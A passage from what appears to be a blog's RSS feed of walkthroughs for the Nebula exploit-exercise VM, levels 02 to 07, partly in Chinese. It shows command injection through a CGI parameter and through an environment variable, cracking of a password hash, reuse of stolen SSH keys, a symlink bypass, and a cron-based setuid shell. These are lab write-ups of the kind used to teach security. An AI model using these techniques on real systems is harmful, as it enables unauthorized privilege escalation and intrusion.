  print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;);
  
}

# check if Host set. if not, display normal page, etc

ping(param(&amp;quot;Host&amp;quot;));
&lt;/code&gt;&lt;/pre&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;solution:6e8e879d12e150811eeb68f592dacf76&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;There is a &lt;em&gt;thttpd&lt;/em&gt; server started with the configuration file &lt;em&gt;/home/flag07/thttpd.conf&lt;/em&gt;, in which there is only one page named &lt;em&gt;index.cgi&lt;/em&gt; with the above code. This perl script mainly executes a &lt;code&gt;ping&lt;/code&gt; command with the user specified argument &lt;code&gt;Host&lt;/code&gt;, and prints the output onto the webpage.&lt;/p&gt;

&lt;p&gt;First access the web page through a browser with the following url:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://192.168.11.118:7007/index.cgi?Host=127.0.0.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And the page looks fine. As the perl script does not check the user input, so we can leaverage it to execute any commands with user &lt;em&gt;flag07&lt;/em&gt; (as the http server starts with user &lt;em&gt;flag07&amp;rsquo;s&lt;/em&gt; privileage, which is configured in &lt;em&gt;thttpd.conf&lt;/em&gt;). Similar to previous exercises, I would like to pass in the argument Host=&amp;ldquo;127.0.0.1;/bin/getflag&amp;rdquo;, so I accessed the following url directly&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://192.168.11.118:7007/index.cgi?Host=127.0.0.1%3B%2Fbin%2Fgetflag
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And it hacks!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 06</title>
      <link>/post/2014-01-13-nebula-level06/</link>
      <pubDate>Mon, 13 Jan 2014 15:48:33 +0800</pubDate>
      
      <guid>/post/2014-01-13-nebula-level06/</guid>
      <description>

&lt;h3 id=&#34;about:07ae660d00a2e044202f8e8de81227df&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;The &lt;em&gt;flag06&lt;/em&gt; account credentials came from a legacy unix system.&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level06&lt;/em&gt; account with the password &lt;em&gt;level06&lt;/em&gt; . Files for this level can be found in /home/flag06.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Check out /etc/passwd&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Decrypted with John the Ripper, and got the login password.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.governmentsecurity.org/articles/crack-unix-linux-passwords.html&#34;&gt;reference&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 05</title>
      <link>/post/2014-01-13-nebula-level05/</link>
      <pubDate>Mon, 13 Jan 2014 14:16:44 +0800</pubDate>
      
      <guid>/post/2014-01-13-nebula-level05/</guid>
      <description>

&lt;h3 id=&#34;about:179c730aaf1ab914fbede043692bc166&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;Check the &lt;em&gt;flag05&lt;/em&gt; home directory. You are looking for weak directory permissions&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level05&lt;/em&gt; account with the password &lt;em&gt;level05&lt;/em&gt; . Files for this level can be found in /home/flag05.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;solution:179c730aaf1ab914fbede043692bc166&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;Copy the file &lt;em&gt;/home/flag05/.backup/backup-19072011.tgz&lt;/em&gt; in to home directory of &lt;em&gt;level05&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;extract it&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level05@nebula:~$ tar -xvf backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So this should be the id key of user &lt;em&gt;flag05&lt;/em&gt;, try to use &lt;code&gt;ssh&lt;/code&gt; to login with user &lt;em&gt;flag05&lt;/em&gt; without a password, and it successed.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level05@nebula:~$ ssh flag05@localhost

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of &amp;quot;levelXX&amp;quot; and password &amp;quot;levelXX&amp;quot;, where
XX is the level number.

Currently there are 20 levels (00 - 19).


Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release &#39;12.04 LTS&#39; available.
Run &#39;do-release-upgrade&#39; to upgrade to it.

flag05@nebula:~$
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 04</title>
      <link>/post/2014-01-10-nebula-level04/</link>
      <pubDate>Fri, 10 Jan 2014 20:43:48 +0800</pubDate>
      
      <guid>/post/2014-01-10-nebula-level04/</guid>
      <description>

&lt;h3 id=&#34;about:1eb2c36cf63b2a5efae90ca35d7075be&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)&lt;/p&gt;

&lt;p&gt;To do this level, log in as the level04 account with the password level04 . Files for this level can be found in /home/flag04.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;solution:1eb2c36cf63b2a5efae90ca35d7075be&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;Source code for /home/flag04/flag04 is&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
    printf(&amp;quot;%s [file to read]\n&amp;quot;, argv[0]);
    exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], &amp;quot;token&amp;quot;) != NULL) {
    printf(&amp;quot;You may not access &#39;%s&#39;\n&amp;quot;, argv[1]);
    exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
    err(EXIT_FAILURE, &amp;quot;Unable to open %s&amp;quot;, argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
    err(EXIT_FAILURE, &amp;quot;Unable to read fd %d&amp;quot;, fd);
  }

  write(1, buf, rc);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This one is easy, just creating a soft link in the home directory of user &lt;em&gt;level04&lt;/em&gt;, and making it readable for user &lt;em&gt;flag03&lt;/em&gt; could bypass the check of the above code, of cause the name of the sofe link could not be &lt;em&gt;token&lt;/em&gt; :-P.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ ln -s /home/flag04/token /home/level04/aa
$ chmod a+rx /home/level04
$ /home/flag04/flag04 /home/level04/aa
&lt;/code&gt;&lt;/pre&gt;

&lt;!-- 06508b5e-8909-4f38-b630-fdb148a848a2 --&gt;

&lt;p&gt;And it works!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 03</title>
      <link>/post/2014-01-09-nebula-level03/</link>
      <pubDate>Thu, 09 Jan 2014 17:03:25 +0800</pubDate>
      
      <guid>/post/2014-01-09-nebula-level03/</guid>
      <description>

&lt;h3 id=&#34;about:328184bcb19288aeb228328d198cf81f&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;Check the home directory of flag03 and take note of the files there.&lt;/p&gt;

&lt;p&gt;There is a crontab that is called every couple of minutes.&lt;/p&gt;

&lt;p&gt;To do this level, log in as the level03 account with the password level03 . Files for this level can be found in /home/flag03.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;solution:328184bcb19288aeb228328d198cf81f&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;No source code is available for this level, but there is a shell script in the home directory of user flag03&lt;/p&gt;

&lt;p&gt;``` sh writable.sh
#!/bin/sh
for i in /home/flag03/writable.d/* ; do
    (ulimit -t 5; bash -x &amp;ldquo;$i&amp;rdquo;)
    rm -f &amp;ldquo;$i&amp;rdquo;
done&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
This script would be executed periodly by cron, after I have finished this level, I logged in with the admin account and get the content of the corresponding crontab file

``` sh /var/spool/cron/crontabs/flag03
*/3 * * * * /home/flag03/writable.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;For the meaning of this crontab file, please refer to the &lt;a href=&#34;https://wiki.archlinux.org/index.php/cron&#34;&gt;Cron Wiki&lt;/a&gt; of Archlinux.&lt;/p&gt;

&lt;p&gt;Back to the script located in &lt;em&gt;/home/flag03&lt;/em&gt;, this script does the following things&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;limits the use cpu time to be 5s&lt;/li&gt;
&lt;li&gt;iterately executes all the executable files in directory &lt;em&gt;/home/flag03/writable.d/&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;delete these executables after executing&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This crontab runs in user &lt;em&gt;flag03&lt;/em&gt;, we could leverage it to do something interesting, like changing the home directory of user &lt;em&gt;flag03&lt;/em&gt; to be public readable and writable, but what we need is beyond this.&lt;/p&gt;

&lt;p&gt;It is easy to find a way to get the privilege of user &lt;em&gt;flag03&lt;/em&gt; after all we have read in the previous exercises. So I wrote the following code in C&lt;/p&gt;

&lt;p&gt;``` c flag03.c
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;&lt;/p&gt;

&lt;p&gt;int main() {
    setresuid(996, 996, 996);
    system(&amp;ldquo;/bin/bash&amp;rdquo;);
}&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
The uid 996 is got by reading */etc/passwd*

``` c
flag03:x:996:996::/home/flag03:/bin/sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What I need now is to make user &lt;em&gt;flag03&lt;/em&gt; compile this C code into an executable that could be run by &lt;em&gt;level04&lt;/em&gt; and the set-user-ID bit is set. So I wrote the following script&lt;/p&gt;

&lt;p&gt;``` sh compile
gcc -o /home/flag03/flag03 /home/level03/flag03.c
chmod 777 /home/flag03/flag03
chmod +s /home/flag03/flag03&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
To make the file */home/level03/flag03.c* readable by user flag03, I changed the permission of my home directory

``` bash
$ chmod a+rx /home/level03
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, place the compile script into &lt;em&gt;/home/flag03/writable.d&amp;rdquo;, and wait patiently for the execution of crontab. After this script is called, I got an executable in */home/flag03&lt;/em&gt; to help me get the privilege of user &lt;em&gt;flag03&lt;/em&gt; :)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level02</title>
      <link>/post/2014-01-09-nebula-level02/</link>
      <pubDate>Thu, 09 Jan 2014 15:13:38 +0800</pubDate>
      
      <guid>/post/2014-01-09-nebula-level02/</guid>
      <description>

&lt;p&gt;基本过程与level01一样，先看/home/flag02/flag02的源代码：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&amp;amp;buffer, &amp;quot;/bin/echo %s is cool&amp;quot;, getenv(&amp;quot;USER&amp;quot;));
  printf(&amp;quot;about to call system(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, buffer);
  
  system(buffer);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;!-- more --&gt;

&lt;p&gt;先通过$USER构建了一个字符串，然后执行该字符串。比如正常情况下&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;buffer=&amp;quot;/bin/echo level02 is cool&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在这里echo程序用了绝对路径，不过那个$USER明显是让我们加以利用的……在本例中echo程序是动不了的了，那怎么能执行其他的命令呢？也很简单，Linux本来就可以在一行中执行多条语句，这里选择用“;”来分割。如下修改$USER&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;USER=&amp;quot;haha; /bin/bash&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;其实这里完全可以使用/bin/getflag的，就直接过掉了，不过每次都这么玩儿没意思，试试开个console吧。修改之后执行：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ $ /home/flag02/flag02
about to call system(&amp;quot;/bin/echo haha; /bin/bash is cool&amp;quot;)
haha
/bin/bash: is: No such file or directory
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;擦，bash执行的时候把后边的is cool当成参数了，这也简单，再次祭出“;”把bash跟他们分开&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;USER=&amp;quot;haha; /bin/bash;&amp;quot;
level02@nebula:~$ /home/flag02/flag02
about to call system(&amp;quot;/bin/echo haha; /bin/bash; is cool&amp;quot;)
haha
flag02@nebula:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样就开了个用户为flag02的bash出来。&lt;/p&gt;

&lt;h3 id=&#34;补充:14ade78cbc8927124133e1983f6ecbf5&#34;&gt;补充&lt;/h3&gt;

&lt;p&gt;其实Linux中分隔命令不止“;”这一种方法，总结下这些分隔符的不同如下：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;“;”：顺序执行所有命令，后一个在前一个之行结束之后才会执行&lt;/li&gt;
&lt;li&gt;“&amp;amp;&amp;amp;”：顺序执行，前一个命令成功执行之后才会执行下一个&lt;/li&gt;
&lt;li&gt;“||”：顺序执行，知道成功执行了一个命令为止（如果第一个成功了，后边的就不会执行）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;还有种方法也可以起到在一行中分隔多个命令的方法，是使用“&amp;amp;”符号，“&amp;amp;”的本意是在一个新的进程中执行命令，对于分割命令这个目的而言算是一种曲线救国的方法了吧……注意因为“&amp;amp;”本身并不是为分隔命令而用的，所以跟其他的有些许不一样，比如以下两条命令&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ la &amp;amp; ll
$ la &amp;amp; ll &amp;amp;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;第一条会在新的进程中执行la，而在本进程中执行ll，第二条则会新起两个进程分别执行la和ll。&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>